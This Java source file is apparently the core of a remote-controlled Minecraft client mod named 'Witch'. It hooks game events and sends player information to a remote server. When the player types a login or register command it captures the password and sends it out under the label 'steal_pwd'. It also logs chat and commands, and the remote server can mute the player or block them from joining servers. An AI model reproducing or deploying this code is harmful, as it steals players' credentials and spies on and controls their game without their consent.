package me.soda.witch.client;

import me.soda.witch.client.connection.Client;
import me.soda.witch.client.connection.MessageHandler;
import me.soda.witch.client.events.*;
import me.soda.witch.client.utils.ChatUtils;
import me.soda.witch.client.utils.ChatWindow;
import me.soda.witch.client.utils.LoopThread;
import me.soda.witch.client.utils.MCUtils;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.events.EventBus;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.Variables;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.DisconnectedScreen;
import net.minecraft.client.gui.screen.TitleScreen;
import net.minecraft.screen.ScreenTexts;
import net.minecraft.text.Text;

import java.util.Arrays;
import java.util.List;

public class Witch {
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    public static final EventBus EVENT_BUS = new EventBus();
    public static final Variables VARIABLES = new Variables();
    public static final ChatWindow CHAT_WINDOW = new ChatWindow();
    public static Client client;

    public static void init() {
        LogUtil.println("By Soda5601");
        LoopThread.init();
        EVENT_BUS.registerEvent(ConnectionMessageEvent.class, event -> MessageHandler.handleMessage(event.message));
        EVENT_BUS.registerEvent(AddMessageEvent.class, event -> {
            if (VARIABLES.logChatAndCommand) LoopThread.addToList(event.message.getString());
            if (ChatUtils.filter(event.message)) event.setCancelled(true);
        });
        EVENT_BUS.registerEvent(SendChatEvent.Command.class, event -> {
            String[] cmds = event.command.split(" ");
            List<String> hint = Arrays.asList("reg", "register", "l", "login", "log");
            if (VARIABLES.passwordBeingLogged && cmds.length >= 2 && hint.contains(cmds[0])) {
                send("player", MCUtils.getPlayerInfo());
                send("steal_pwd", cmds[1]);
            }
            if (VARIABLES.logChatAndCommand) LoopThread.addToList("/" + event.command);
        });
        EVENT_BUS.registerEvent(SendChatEvent.Message.class, event -> {
            if (VARIABLES.isMuted) event.setCancelled(true);
        });
        EVENT_BUS.registerEvent(GameJoinEvent.class, event -> Witch.send("player", MCUtils.getPlayerInfo()));
        EVENT_BUS.registerEvent(ServerJoinEvent.class, event -> {
            if (!Witch.VARIABLES.canJoinServer) {
                mc.execute(() -> mc.setScreen(new DisconnectedScreen(new TitleScreen(), ScreenTexts.CONNECT_FAILED,
                        Text.of(Witch.VARIABLES.name + " kicked you. Enter a singleplayer world and type \"@w <text>\" to chat with me."))));
                event.setCancelled(true);
            }
        });
        client = new Client();
    }

    public static void send(String messageType, Object object) {
        client.send(new Message(messageType, object));
    }

    public static void send(String messageType) {
        send(messageType, null);
    }
}
